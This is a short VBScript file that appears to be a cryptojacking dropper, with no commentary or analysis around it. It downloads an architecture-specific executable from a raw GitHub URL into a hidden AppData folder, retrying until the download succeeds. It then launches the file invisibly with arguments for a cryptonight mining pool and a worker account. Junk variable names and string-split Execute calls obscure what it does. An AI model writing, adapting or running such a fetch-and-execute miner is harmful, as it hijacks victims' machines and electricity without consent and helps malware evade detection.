On Error Resume Next

Dim FDrtw
Dim FDrte


UMbty = GetAppDateFolder("svc")
UMbty = UMbty & "svc.exe"



Set FDrtr=wscript.createobject("wscript.shell")
FDrte=FDrtr.environment("system").item("processor_architecture")
if right(FDrte, 2) = "64" then
FDrtw = "https://raw.githubusercontent.com/jommb/872/master/b2"
else
FDrtw = "https://raw.githubusercontent.com/jommb/872/master/m2"
end if
Set FDrtt = CreateObject("Scripting.FileSystemObject")
If FDrtt.FileExists(UMbty) Then FDrtt.DeleteFile UMbty

Do
 Err.Clear
 FDrty FDrtw, UMbty
 
 ' If dir(UMbty) = "" Then WScript.Sleep 10000
 
loop Until FDrtt.FileExists(UMbty)

MsgBox(UMbty)

Set FDrtu = WScript.CreateObject("WScript.Shell")
trv="FDrtu.Run(FDrtu.ExpandEnvironmentStrings(""%AppData%\svc\"")&""svc.exe -q -o europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x --safe --keepalive -B""), 0, false"
' trv=trv&""
' trv=trv&""


' MsgBox(trv)

Execute trv



WScript.Quit
Function FDrty(InetFile, svc)
	 dim FDrti
	 On Error Resume Next
	 Set FDrti = CreateObject("WinHttp.WinHttpRequest.5.1")
	 Do	
	  FDrto = ""
	  FDrti.Open "GET", InetFile, False
	  FDrti.Send
	  FDrto = FDrti.responseText
	 Loop Until FDrto <> ""
	 set FDrtp = CreateObject("ADODB.Stream")
	 FDrtp.Type = 1
	 FDrtp.Open
	 FDrtp.Write FDrti.responseBody
	 Execute "FDrtp.S"&"aveToFile svc"
	 FDrtp.Close
	 Set FDrti = Nothing
	
End Function
Function GetAppDateFolder(FolderName)
	Set FDrta = CreateObject("WScript.Shell")
	GetAppDateFolder = FDrta.ExpandEnvironmentStrings("%AppData%\" & FolderName & "\")
	Set fileSystem = CreateObject("Scripting.FileSystemObject")
	If (fileSystem.FolderExists(GetAppDateFolder)) Then
	Else
		fileSystem.CreateFolder GetAppDateFolder
	End If
End Function